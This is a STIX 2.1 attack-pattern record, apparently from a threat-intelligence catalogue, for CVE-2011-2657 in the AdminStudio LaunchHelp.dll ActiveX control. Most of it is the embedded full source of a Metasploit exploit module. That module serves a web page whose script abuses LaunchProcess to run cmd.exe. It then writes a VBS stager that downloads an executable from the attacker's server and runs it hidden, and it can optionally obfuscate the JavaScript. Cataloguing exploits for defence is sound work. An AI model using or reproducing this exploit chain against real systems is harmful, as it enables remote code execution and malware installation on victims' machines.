{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--03120861-ab3f-4bd4-bfd7-9883cced3e7a",
    "created": "2024-08-14T16:41:06.85433Z",
    "modified": "2024-08-14T16:41:06.854334Z",
    "name": "AdminStudio LaunchHelp.dll ActiveX Arbitrary Code Execution",
    "description": " This module exploits a vulnerability in AdminStudio LaunchHelp.dll ActiveX control. The LaunchProcess function found in LaunchHelp.HelpLauncher.1 allows remote attackers to run arbitrary commands on the victim machine. This module has been successfully tested with the ActiveX installed with AdminStudio 9.5, which also comes with Novell ZENworks Configuration Management 10 SP2, on IE 6 and IE 8 over Windows XP SP 3.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/zenworks_helplauncher_exec.rb",
            "external_id": "zenworks_helplauncher_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2657"
        },
        {
            "source_name": "reference",
            "url": "http://www.novell.com/support/viewContent.do?externalId=7009570&sliceId=1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'AdminStudio LaunchHelp.dll ActiveX Arbitrary Code Execution',\n        'Description' => %q{\n          This module exploits a vulnerability in AdminStudio LaunchHelp.dll ActiveX control. The\n          LaunchProcess function found in LaunchHelp.HelpLauncher.1 allows remote attackers to run\n          arbitrary commands on the victim machine. This module has been successfully tested with the\n          ActiveX installed with AdminStudio 9.5, which also comes with Novell ZENworks Configuration\n          Management 10 SP2, on IE 6 and IE 8 over Windows XP SP 3.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'rgod', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2011-2657' ],\n          [ 'OSVDB', '76700'],\n          [ 'BID', '50274' ],\n          [ 'ZDI', '11-318' ],\n          [ 'URL', 'http://www.novell.com/support/viewContent.do?externalId=7009570&sliceId=1' ],\n        ],\n        'Payload' => {\n          'Space' => 1024,\n          'BadChars' => \"\\x00\",\n        },\n        'DefaultOptions' => {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          # LaunchHelp.dll 9.5.0.0\n          [ 'Windows Universal', {} ],\n        ],\n        'DisclosureDate' => '2011-10-19',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('WINDOWSTEMP', [ true, \"The Windows temporal folder.\", \"C:/Windows/Temp\" ]),\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false]),\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session(client)\n    if client.type != \"meterpreter\"\n      print_error(\"NOTE: you must use a meterpreter payload in order to automatically cleanup.\")\n      print_error(\"The vbs stager and exe payload must be removed manually.\")\n      return\n    end\n\n    # stdapi must be loaded before we can use fs.file\n    client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n\n    begin\n      print_warning(\"Deleting the vbs payload \\\"#{@stager_name}\\\" ...\")\n      client.fs.file.rm(\"#{@temp_folder}/#{@stager_name}\")\n      print_good(\"The vbs stager has been deleted successfully\")\n      print_status(\"The exe payload #{@temp_folder}/#{@payload_name}.exe must be removed manually\")\n    rescue ::Exception => e\n      print_error(\"Problems while the clenaup\")\n      print_status(\"The vbs stager #{@temp_folder}/#{@stager_name} must be removed manually\")\n      print_status(\"The exe payload #{@temp_folder}/#{@payload_name}.exe must be removed manually\")\n      print_error(\"Exception: #{e.inspect}\")\n      return\n    end\n  end\n\n  # Stager wrote by sinn3r to avoid problems when echoing the vbs cmdstager too many times.\n  # See \"real_arcade_installerdlg.rb\" for more information.\n  def build_vbs(url)\n    name_xmlhttp = rand_text_alpha(2)\n    name_adodb = rand_text_alpha(2)\n\n    tmp = \"#{@temp_folder}/#{@stager_name}\"\n\n    vbs = \"echo Set #{name_xmlhttp} = CreateObject(\\\"Microsoft.XMLHTTP\\\") \"\n    vbs << \": #{name_xmlhttp}.open \\\"GET\\\",\\\"http://#{url}\\\",False : #{name_xmlhttp}.send\"\n    vbs << \": Set #{name_adodb} = CreateObject(\\\"ADODB.Stream\\\") \"\n    vbs << \": #{name_adodb}.Open : #{name_adodb}.Type=1 \"\n    vbs << \": #{name_adodb}.Write #{name_xmlhttp}.responseBody \"\n    vbs << \": #{name_adodb}.SaveToFile \\\"#{@temp_folder}/#{@payload_name}.exe\\\",2 \"\n    vbs << \": CreateObject(\\\"WScript.Shell\\\").Run \\\"#{@temp_folder}/#{@payload_name}.exe\\\",0 >> #{tmp}\"\n    return vbs\n  end\n\n  def exploit\n    @payload_name = rand_text_alpha(4)\n    @temp_folder = datastore['WINDOWSTEMP']\n    @stager_name = rand_text_alpha(6) + \".vbs\"\n    super\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if not agent =~ /MSIE/\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    if request.uri =~ /\\.exe/\n      print_status(\"Sending payload EXE\")\n      return if ((p = regenerate_payload(cli)) == nil)\n\n      data = generate_payload_exe({ :code => p.encoded })\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    # Payload's URL\n    payload_src = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    payload_src << \":#{datastore['SRVPORT']}#{get_resource}/#{@payload_name}.exe\"\n\n    # Create the stager (download + execute payload)\n    stager = build_vbs(payload_src)\n\n    js = <<-JS\n    var actvx = new ActiveXObject('LaunchHelp.HelpLauncher.1');\n    actvx.LaunchProcess(\"cmd.exe\", '/c #{stager}');\n    actvx.LaunchProcess(\"cmd.exe\", \"/c start #{@temp_folder}/#{@stager_name}\");\n    JS\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    html = <<-EOS\n    <html>\n    <body>\n    <script>\n    #{js}\n    </script>\n    </body>\n    </html>\n    EOS\n\n    # Remove extra tabs\n    html = html.gsub(/^ {4}/, \"\")\n\n    print_status(\"Sending #{self.name}\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-10-19",
    "x_mitre_platforms": [
        "win'"
    ]
}